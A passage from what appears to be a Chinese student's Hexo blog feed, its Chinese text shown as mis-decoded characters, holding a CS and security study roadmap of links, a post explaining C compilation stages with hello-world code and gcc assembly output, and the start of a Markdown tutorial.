href="https://github.com/richardodliu/CS-BAOYAN/blob/main/%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E5%B8%96/%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E8%B4%B4.md">ä¿ç ”ç»éªŒè´´åˆé›†</a></li><li><a href="https://github.com/my-style/computer-exemption">è®¡ç®—æœºç±»ä¿ç ”å‡†å¤‡_1</a></li><li><a href="https://github.com/richardodliu/CS-BAOYAN">è®¡ç®—æœºç±»ä¿ç ”å‡†å¤‡_2</a></li></ul><h1 id="ä¹¦ç±æ¨è"><a href="#ä¹¦ç±æ¨è" class="headerlink" title="ä¹¦ç±æ¨è"></a>ä¹¦ç±æ¨è</h1><ul><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E5%92%8C%E6%8C%87%E9%92%88.pdf">Cå’ŒæŒ‡é’ˆ</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%20.pdf">Cç¨‹åºè®¾è®¡è¯­è¨€</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E9%99%B7%E9%98%B1%E4%B8%8E%E7%BC%BA%E9%99%B7.pdf">Cé™·é˜±ä¸ç¼ºé™·</a></li><li>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥ã€è£…è½½ä¸åº“ï¼ˆä¸è¦è¢«ä¹¦åéª—äº†ï¼Œè¿™æ˜¯ä¸€æœ¬Cè¯­è¨€è¿›é˜¶ä¹¦ç±ï¼Œè¿˜æ˜¯æ¯”è¾ƒéš¾çš„ï¼‰</li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/x86%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80_%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F(%E5%AE%8C%E6%95%B4%E6%89%AB%E6%8F%8F%E7%89%88).pdf">x86æ±‡ç¼–è¯­è¨€_ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E7%90%A2%E7%9F%B3%E6%88%90%E5%99%A8%EF%BC%9A%20%20Windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.pdf">ç¢çŸ³æˆå™¨ï¼š Windowsç¯å¢ƒä¸‹32ä½æ±‡ç¼–è¯­è¨€ç¨‹åºè®¾è®¡</a></li><li>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/Linux/%E3%80%8A%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C-%E5%9F%BA%E7%A1%80%E7%AF%87%E3%80%8B%E7%AC%AC%E5%9B%9B%E7%89%88.pdf">ã€Šé¸Ÿå“¥çš„Linuxç§æˆ¿èœã€‹</a></li></ul><h1 id="è‡ªå­¦èµ„æº-amp-repo-amp-ç½‘ç«™æ¨è"><a href="#è‡ªå­¦èµ„æº-amp-repo-amp-ç½‘ç«™æ¨è" class="headerlink" title="è‡ªå­¦èµ„æº &amp; repo &amp; ç½‘ç«™æ¨è"></a>è‡ªå­¦èµ„æº &amp; repo &amp; ç½‘ç«™æ¨è</h1><ul><li><p><a href="https://github.com/PKUFlyingPig/cs-self-learning">åŒ—å¤§è®¡ç®—æœºè‡ªå­¦æŒ‡å—</a></p><ul><li>åœ¨åŒ—å¤§ä¿¡ç§‘ä¸“ä¸šæµä¼ çš„è‡ªå­¦æŒ‡å—ï¼Œä¸€ä¸ªä¾›å‚è€ƒçš„CSå­¦ä¹ è§„åˆ’</li><li><blockquote><p>ä»»ä½•æœ‰å¿—äºè‡ªå­¦è®¡ç®—æœºçš„æœ‹å‹éƒ½å¯ä»¥å‚è€ƒè¿™æœ¬ä¹¦ã€‚å¦‚æœä½ å·²ç»æœ‰äº†ä¸€å®šçš„è®¡ç®—æœºåŸºç¡€ï¼Œåªæ˜¯å¯¹æŸä¸ªç‰¹å®šçš„é¢†åŸŸæ„Ÿå…´è¶£ï¼Œå¯ä»¥é€‰æ‹©æ€§åœ°æŒ‘é€‰ä½ æ„Ÿå…´è¶£çš„å†…å®¹è¿›è¡Œå­¦ä¹ ã€‚å½“ç„¶ï¼Œå¦‚æœä½ æ˜¯ä¸€ä¸ªåƒæˆ‘å½“å¹´ä¸€æ ·å¯¹è®¡ç®—æœºä¸€æ— æ‰€çŸ¥çš„å°ç™½ï¼Œåˆå…¥å¤§å­¦çš„æ ¡é—¨ï¼Œæˆ‘å¸Œæœ›è¿™æœ¬ä¹¦èƒ½æˆä¸ºä½ çš„æ”»ç•¥ï¼Œè®©ä½ èŠ±æœ€å°‘çš„æ—¶é—´æŒæ¡ä½ æ‰€éœ€è¦çš„çŸ¥è¯†å’Œèƒ½åŠ›ã€‚æŸç§ç¨‹åº¦ä¸Šï¼Œè¿™æœ¬ä¹¦æ›´åƒæ˜¯ä¸€ä¸ªæ ¹æ®æˆ‘çš„ä½“éªŒæ¥æ’åºçš„è¯¾ç¨‹æœç´¢å¼•æ“ï¼Œå¸®åŠ©å¤§å®¶è¶³ä¸å‡ºæˆ·ï¼Œä½“éªŒä¸–ç•Œé¡¶çº§åæ ¡çš„è®¡ç®—æœºä¼˜è´¨è¯¾ç¨‹</p></blockquote></li></ul></li><li><p><a href="https://github.com/yifengyou/learn-c">C è¯­è¨€è¿›é˜¶</a></p><ul><li>ä¸æ‹©æ‰‹æ®µå­¦Cï¼Œç”¨æ±‡ç¼–å’Œä½“ç³»ç»“æ„ç›¸å…³çŸ¥è¯†ç†è§£Cè¯­è¨€æœ¬è´¨ï¼Œç”¨æ€ç»´å¯¼å›¾ç†è§£Cè¯­è¨€è¯­æ³•ã€‚æ¸…æ¸…ç™½ç™½å­¦C</li></ul></li><li><p><a href="https://github.com/QSCTech/zju-icicles">æµ™æ±Ÿå¤§å­¦è¯¾ç¨‹æ”»ç•¥å…±äº«è®¡åˆ’</a></p><ul><li>åŒ…å«æµ™æ±Ÿå¤§å­¦é€‰è¯¾æ”»ç•¥ã€ç”µå­ç‰ˆæ•™æã€å¹³æ—¶ä½œä¸šç­”æ¡ˆå¹´è¯•å·ã€å¤ä¹ èµ„æ–™ç­‰</li></ul></li><li><p><a href="https://ctf-wiki.org/">ctf-wiki</a></p><ul><li>ymè€å¸ˆçš„è¯¾å¯ä»¥æ¦‚æ‹¬ä¸ºpwnå’Œé€†å‘ï¼Œè¯¥ç½‘ç«™åŒ…å«äº†å‡ ä¹ctfæ‰€æœ‰çŸ¥è¯†ç‚¹ï¼Œè¿›å»åç‚¹å‡»pwn/reverseå‘ç°æ–°ä¸–ç•Œ</li></ul></li><li><p><a href="https://www.anquanke.com/">å®‰å…¨å®¢</a></p><ul><li>ä¸€ä¸ªä¸ºå¹¿å¤§å®‰å…¨çˆ±å¥½è€…å’Œå®‰å…¨ä»ä¸šäººå‘˜æä¾›æƒå¨ä¿¡æ¯å‘å¸ƒçš„æ¼æ´ä¿¡æ¯ã€æœ€æ–°çš„å®‰å…¨èµ„è®¯ã€æœ€å…¨çš„å®‰å…¨çŸ¥è¯†åŠç²¾å½©çš„å®‰å…¨æ´»åŠ¨çš„æå…·å½±å“åŠ›çš„ä¸€ç«™å¼å®‰å…¨å¹³å° </li></ul></li><li><p><a href="https://www.freebuf.com/">FreeBuf</a></p><ul><li>å›½å†…å…³æ³¨åº¦æœ€é«˜çš„äº’è”ç½‘å®‰å…¨åª’ä½“ä¹‹ä¸€</li></ul></li><li><p><a href="https://www.anquanquan.info/">å®‰å…¨åœˆ</a></p><ul><li>ä¿¡æ¯å®‰å…¨å¯¼èˆªç½‘ç«™</li></ul></li></ul><h1 id="è¯¾ç¨‹ä¹‹å¤–çš„çŸ¥è¯†"><a href="#è¯¾ç¨‹ä¹‹å¤–çš„çŸ¥è¯†" class="headerlink" title="è¯¾ç¨‹ä¹‹å¤–çš„çŸ¥è¯†"></a>è¯¾ç¨‹ä¹‹å¤–çš„çŸ¥è¯†</h1><ul><li><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">æé—®çš„æ™ºæ…§</a><ul><li>ä½œä¸ºç¨‹åºå‘˜ä½ è¯¥å¦‚ä½•æé—®ï¼Ÿ<ul><li>RTFMï¼ˆRead The Fucking Manualï¼‰ä½ éœ€è¦å­¦ä¼šè¯»æ‰‹å†Œ</li><li>STFWï¼ˆSearch The Fucking Webï¼‰ä½ éœ€è¦å­¦ä¼šåœ¨Stack Overflowã€stack exchangeã€Googleç­‰ç½‘ç«™æœç´¢</li></ul></li><li>ä¸€äº›æ„šè ¢çš„é—®é¢˜ï¼Ÿ<ul><li>æˆ‘èƒ½åœ¨å“ªæ‰¾åˆ° X ç¨‹åºæˆ– X èµ„æºï¼Ÿ<ul><li>å°±åœ¨æˆ‘æ‰¾åˆ°å®ƒçš„åœ°æ–¹å•Šï¼Œç™½ç—´ â€”â€” æœç´¢å¼•æ“çš„é‚£ä¸€å¤´ã€‚å¤©å“ªï¼éš¾é“è¿˜æœ‰äººä¸ä¼šç”¨ Google å—ï¼Ÿ</li></ul></li><li>æˆ‘çš„ Windows ç”µè„‘æœ‰é—®é¢˜ï¼Œä½ èƒ½å¸®æˆ‘å—ï¼Ÿ<ul><li>æ‰”æ‰å¾®è½¯çš„åƒåœ¾ï¼Œæ¢ä¸ªåƒ Linux æˆ– BSD çš„å¼€æºæ“ä½œç³»ç»Ÿå§</li></ul></li><li>æˆ‘åœ¨å®‰è£… Linuxï¼ˆæˆ–è€… X ï¼‰æ—¶æœ‰é—®é¢˜ï¼Œä½ èƒ½å¸®æˆ‘å—ï¼Ÿ<ul><li>å›ç­”ï¼šä¸èƒ½ï¼Œæˆ‘åªæœ‰äº²è‡ªåœ¨ä½ çš„ç”µè„‘ä¸ŠåŠ¨æ‰‹æ‰èƒ½æ‰¾åˆ°æ¯›ç—…ã€‚è¿˜æ˜¯å»æ‰¾ä½ å½“åœ°çš„ Linux ä½¿ç”¨ç¾¤ç»„è€…å¯»æ±‚å®é™…çš„æŒ‡å¯¼å§ï¼ˆä½ èƒ½åœ¨è¿™å„¿æ‰¾åˆ°ç”¨æˆ·ç¾¤ç»„çš„æ¸…å•ï¼‰</li></ul></li></ul></li></ul></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><h1 id="å¯†ç å­¦"><a href="#å¯†ç å­¦" class="headerlink" title="å¯†ç å­¦"></a>å¯†ç å­¦</h1><h1 id="ç›¸å…³å·¥ä½œ"><a href="#ç›¸å…³å·¥ä½œ" class="headerlink" title="ç›¸å…³å·¥ä½œ"></a>ç›¸å…³å·¥ä½œ</h1><ul><li><a href="https://survivesjtu.gitbook.io/survivesjtumanual/li-zhi-pian/huan-ying-lai-dao-shang-hai-jiao-tong-da-xue">ä¸Šæµ·äº¤é€šå¤§å­¦ç”Ÿå­˜æŒ‡å—</a></li><li><a href="https://github.com/PKUanonym/REKCARC-TSC-UHT">æ¸…åå¤§å­¦è®¡ç®—æœºç³»è¯¾ç¨‹æ”»ç•¥</a></li><li><a href="https://github.com/QSCTech/zju-icicles">æµ™æ±Ÿå¤§å­¦è¯¾ç¨‹æ”»ç•¥å…±äº«è®¡åˆ’</a></li><li><a href="https://github.com/lib-pku/libpku">åŒ—äº¬å¤§å­¦è¯¾ç¨‹èµ„æ–™æ•´ç†</a></li><li><a href="https://zhuanlan.zhihu.com/p/447898788">GitHub å¼€æºè®¡ç®—æœºè¯¾ç¨‹æ”»ç•¥ yyds</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ è·¯çº¿</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å­¦ä¹ è·¯çº¿ï¼Œå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ï¼šå‡½æ•°æ¥å£</title>
    <link href="/p/be75cde9/"/>
    <url>/p/be75cde9/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cè¯­è¨€ï¼ŒæŒ‡é’ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸï¼šä».cæ–‡ä»¶åˆ°äºŒè¿›åˆ¶æ–‡ä»¶</title>
    <link href="/p/2e9a027c/"/>
    <url>/p/2e9a027c/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ä¸ª-cæ–‡ä»¶æ˜¯å¦‚ä½•æˆä¸ºä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ï¼Ÿ"><a href="#ä¸€ä¸ª-cæ–‡ä»¶æ˜¯å¦‚ä½•æˆä¸ºä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ï¼Ÿ" class="headerlink" title="ä¸€ä¸ª.cæ–‡ä»¶æ˜¯å¦‚ä½•æˆä¸ºä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ï¼Ÿ"></a>ä¸€ä¸ª.cæ–‡ä»¶æ˜¯å¦‚ä½•æˆä¸ºä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ï¼Ÿ</h1><table><thead><tr><th>æ–‡ä»¶åç¼€</th><th>è¢«æ‰§è¡Œè¿‡ç¨‹</th><th>å·¥å…·</th><th>ç»†èŠ‚</th></tr></thead><tbody><tr><td>.c</td><td>é¢„å¤„ç†</td><td>é¢„å¤„ç†å™¨ï¼ˆcppï¼Œc pre-processorï¼‰</td><td>å®æ›¿æ¢ã€å¤´æ–‡ä»¶å±•å¼€ã€æ³¨é‡Šåˆ é™¤</td></tr><tr><td>.i</td><td>ç¼–è¯‘</td><td>ccl</td><td>Cè¯­è¨€ç¨‹åºè½¬åŒ–ä¸ºæ±‡ç¼–è¯­è¨€ç¨‹åº(.s)</td></tr><tr><td>.s</td><td>æ±‡ç¼–</td><td>ç¼–è¯‘å™¨</td><td>æ±‡ç¼–è¯­è¨€ç¨‹åºè½¬åŒ–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶(.o)</td></tr><tr><td>.o</td><td>é“¾æ¥</td><td>ldï¼ˆé“¾æ¥å™¨ï¼‰</td><td>å°†å¤šä¸ª.oæ–‡ä»¶é“¾æ¥ä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</td></tr></tbody></table><p><img src="/image/31h00bitb5.jpg"></p><h1 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h1><p>ä½¿ç”¨cppï¼ˆC é¢„å¤„ç†å™¨ï¼‰å®Œæˆäº†ï¼š</p><ul><li>å°†.cæ–‡ä»¶è½¬åŒ–ä¸º.iæ–‡ä»¶<ul><li>åœ¨è¿™é‡Œ.iæ–‡ä»¶åªæ˜¯ä¸€ä¸ªåç¼€è€Œå·²ï¼Œæœ¬è´¨ä¸Šä»ç„¶æ˜¯æ–‡æœ¬æ–‡ä»¶</li></ul></li><li>å®æ›¿æ¢</li><li>å¤´æ–‡ä»¶å±•å¼€<ul><li>æ‰¾åˆ°#includeçš„æ–‡ä»¶å†…å®¹å°†å…¶æ’å…¥åˆ°.cæ–‡ä»¶ä¸­</li></ul></li><li>æ³¨é‡Šåˆ é™¤</li></ul><p>å°†hello.cæ–‡ä»¶å¾—åˆ°çš„é¢„å¤„ç†ç»“æœé‡å®šå‘åˆ°hello.i</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cpp hello.c &gt; hello.i<br></code></pre></td></tr></table></figure><blockquote><p>å¯ä»¥ä½¿ç”¨man cppå¾—åˆ°é¢„å¤„ç†å™¨çš„ç›¸å…³ä¿¡æ¯</p></blockquote><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *msg = <span class="hljs-string">&quot;Hello, world!\n&quot;</span>;<br>    syscall(SYS_write, <span class="hljs-number">1</span>, msg, <span class="hljs-built_in">strlen</span>(msg));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h1><ul><li>ä½¿ç”¨ç¼–è¯‘å™¨å°†.iæ–‡ä»¶è½¬æ¢ä¸º.sæ–‡ä»¶</li><li>å°†Cè¯­è¨€æ–‡æœ¬è½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€æ–‡æœ¬(Assembly Code)</li><li>å‘½ä»¤ï¼š<code> gcc hello.i -S -o hello.s</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">        .file   <span class="hljs-string">&quot;hello.c&quot;</span><br>        .text<br>        .section        .rodata<br>.LC0:<br>        .<span class="hljs-built_in">string</span> <span class="hljs-string">&quot;Hello, world!\n&quot;</span><br>        .text<br>        .globl  main<br>        .type   main, @function<br>main:<br>.LFB0:<br>        .cfi_startproc<br>        endbr64<br>        pushq   %rbp<br>        .cfi_def_cfa_offset <span class="hljs-number">16</span><br>        .cfi_offset <span class="hljs-number">6</span>, <span class="hljs-number">-16</span><br>        movq    %rsp, %rbp<br>        .cfi_def_cfa_register <span class="hljs-number">6</span><br>        subq    $<span class="hljs-number">32</span>, %rsp<br>        movl    %edi, <span class="hljs-number">-20</span>(%rbp)<br>        movq    %rsi, <span class="hljs-number">-32</span>(%rbp)<br>        leaq    .LC0(%rip), %rax<br>        movq    %rax, <span class="hljs-number">-8</span>(%rbp)<br>        movq    <span class="hljs-number">-8</span>(%rbp), %rax<br>        movq    %rax, %rdi<br>        call    <span class="hljs-built_in">strlen</span>@PLT<br>        movq    %rax, %rdx<br>        movq    <span class="hljs-number">-8</span>(%rbp), %rax<br>        movq    %rdx, %rcx<br>        movq    %rax, %rdx<br>        movl    $<span class="hljs-number">1</span>, %esi<br>        movl    $<span class="hljs-number">1</span>, %edi<br>        movl    $<span class="hljs-number">0</span>, %eax<br>        call    syscall@PLT<br>        movl    $<span class="hljs-number">0</span>, %eax<br>        leave<br>        .cfi_def_cfa <span class="hljs-number">7</span>, <span class="hljs-number">8</span><br>        ret<br>        .cfi_endproc<br>.LFE0:<br>        .size   main, .-main<br>        .ident  <span class="hljs-string">&quot;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0&quot;</span><br>        .section        .note.GNU-<span class="hljs-built_in">stack</span>,<span class="hljs-string">&quot;&quot;</span>,@progbits<br>        .section        .note.gnu.property,<span class="hljs-string">&quot;a&quot;</span><br>        .align <span class="hljs-number">8</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">1f</span> - <span class="hljs-number">0f</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">4f</span> - <span class="hljs-number">1f</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">5</span><br><span class="hljs-number">0</span>:<br>        .<span class="hljs-built_in">string</span>  <span class="hljs-string">&quot;GNU&quot;</span><br><span class="hljs-number">1</span>:<br>        .align <span class="hljs-number">8</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">0xc0000002</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">3f</span> - <span class="hljs-number">2f</span><br><span class="hljs-number">2</span>:<br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">0x3</span><br><span class="hljs-number">3</span>:<br>        .align <span class="hljs-number">8</span><br><span class="hljs-number">4</span>:<br></code></pre></td></tr></table></figure><table><thead><tr><th>.file</th><th>æºæ–‡ä»¶</th></tr></thead><tbody><tr><td>.text</td><td>ä»£ç æ®µ</td></tr><tr><td>.global</td><td>å…¨å±€å˜é‡</td></tr><tr><td>.data</td><td>å­˜æ”¾å·²ç»åˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€C å˜é‡</td></tr><tr><td>.section  .rodata</td><td>å­˜æ”¾åªè¯»å˜é‡</td></tr><tr><td>.align</td><td>å¯¹é½æ–¹å¼</td></tr><tr><td>.type</td><td>è¡¨ç¤ºæ˜¯å‡½æ•°ç±»å‹/å¯¹è±¡ç±»å‹</td></tr><tr><td>.size</td><td>è¡¨ç¤ºå¤§å°</td></tr><tr><td>.long  .string</td><td>è¡¨ç¤ºæ˜¯longç±»å‹/stringç±»å‹</td></tr></tbody></table><h1 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h1><ul><li>ç¼–è¯‘å™¨å°†æ±‡ç¼–è¯­è¨€ç¨‹åºè½¬åŒ–ä¸ºå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</li><li>.s â€”&gt; .o æŒ‡ä»¤ä¸º<code>gcc -c hello.s -o hello.o</code></li><li>objdump åˆ†æhello.oï¼š<code>objdump -d hello.o</code></li></ul><h1 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h1><p>å°†å¤šä¸ª.oæ–‡ä»¶é“¾æ¥ä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</p><p>å…³äºé“¾æ¥å™¨çš„æ›´å¤šå†…å®¹ï¼š<code>man ld</code></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdownå¿«é€Ÿå…¥é—¨</title>
    <link href="/p/2e672870/"/>
    <url>/p/2e672870/</url>
    
    <content type="html"><![CDATA[<h2 id="Markdownç®€ä»‹"><a href="#Markdownç®€ä»‹" class="headerlink" title="Markdownç®€ä»‹"></a>Markdownç®€ä»‹</h2><ul><li>Markdown æ˜¯ä¸€ç§è½»é‡çº§æ ‡è®°è¯­è¨€</li><li>Markdown ç¼–å†™çš„æ–‡æ¡£å¯ä»¥å¯¼å‡ºä¸ºå¤šç§æ ¼å¼ï¼Œæ¯”å¦‚PDFï¼Œwordï¼ŒHTMLç­‰ã€‚å¹³æ—¶å†™å®éªŒæŠ¥å‘Šå°±å¯ä»¥ç”¨Markdownç¼–å†™ç„¶åè¾“å‡ºä¸ºPDFæ ¼å¼</li><li>Markdown ç¼–å†™çš„æ–‡æ¡£åç¼€ä¸º<code> .md</code></li><li>å¸¸ç”¨ç¼–è¾‘å™¨ï¼š <a href="https://www.typora.io/">typora</a>ã€vscode</li></ul><hr><h2 id="Markdownçš„å¥½å¤„"><a href="#Markdownçš„å¥½å¤„" class="headerlink" title="Markdownçš„å¥½å¤„"></a>Markdownçš„å¥½å¤„</h2><ul><li>å¯ä»¥åªå…³æ³¨æ–‡å­—å†…å®¹æœ¬èº«ï¼Œè€Œä¸æ˜¯èŠ±å¤ªå¤šæ—¶é—´åœ¨æ’ç‰ˆä¸Š</li><li>å¯ä»¥å¯¼å‡ºä¸ºå¤šç§æ ¼å¼</li><li>ä¹¦å†™ç¾è§‚å¤§æ–¹</li><li>å­¦ä¹ ä¹‹åå¯ä»¥ç”¨åœ¨ä¹¦å†™åšå®¢ã€gitbookç­‰ä¸Šé¢ï¼Œç°åœ¨å¾ˆå¤šå†…å®¹åˆ›ä½œå¹³å°éƒ½æ”¯æŒMarkdownè¯­æ³•</li></ul><hr><h2 id="Markdownå¿«é€Ÿå…¥é—¨"><a href="#Markdownå¿«é€Ÿå…¥é—¨" class="headerlink" title="Markdownå¿«é€Ÿå…¥é—¨"></a>Markdownå¿«é€Ÿå…¥é—¨</h2><hr><h3 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h3><p><code>#</code>åé¢æ˜¯æ ‡é¢˜ï¼Œæœ‰å‡ ä¸ª#è¡¨ç¤ºæ˜¯å‡ çº§æ ‡é¢˜</p><h1 id="è¿™æ˜¯ä¸€çº§æ ‡é¢˜"><a href="#è¿™æ˜¯ä¸€çº§æ ‡é¢˜" class="headerlink" title="è¿™æ˜¯ä¸€çº§æ ‡é¢˜"></a>è¿™æ˜¯ä¸€çº§æ ‡é¢˜</h1><h2 id="è¿™æ˜¯äºŒçº§æ ‡é¢˜"><a href="#è¿™æ˜¯äºŒçº§æ ‡é¢˜" class="headerlink" title="è¿™æ˜¯äºŒçº§æ ‡é¢˜"></a>è¿™æ˜¯äºŒçº§æ ‡é¢˜</h2><h3 id="è¿™æ˜¯ä¸‰çº§æ ‡é¢˜"><a href="#è¿™æ˜¯ä¸‰çº§æ ‡é¢˜" class="headerlink" title="è¿™æ˜¯ä¸‰çº§æ ‡é¢˜"></a>è¿™æ˜¯ä¸‰çº§æ ‡é¢˜</h3><p>åœ¨typoraä¸­æ›´åŠ æ–¹ä¾¿ï¼Œç›´æ¥ctrl+æ•°å­—é”®å³å¯åˆ›å»ºæ ‡é¢˜</p><h3 id="æ®µè½"><a href="#æ®µè½" class="headerlink" title="æ®µè½"></a>æ®µè½</h3><hr><ul><li>å¦‚æœæ–‡å­—ä¹‹é—´ç©ºä¸€è¡Œï¼Œè¡¨ç¤ºæ˜¯ä¸¤ä¸ªæ®µè½</li><li>å¦‚æœæ²¡æœ‰æ–‡å­—ä¹‹é—´æ²¡æœ‰ç©ºè¡Œï¼Œè¯´æ˜æ˜¯ä¸€ä¸ªæ®µè½</li></ul><hr><h3 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h3><p>_æ–œä½“_ï¼š  _æ–‡å­—_<br><strong>ç²—ä½“</strong>ï¼š**æ–‡å­—**<br><em><strong>ç²—æ–œä½“</strong></em>ï¼š***ç²—æ–œä½“æ–‡æœ¬***</p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>æ”¯æŒé«˜äº®æ˜¾ç¤º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> 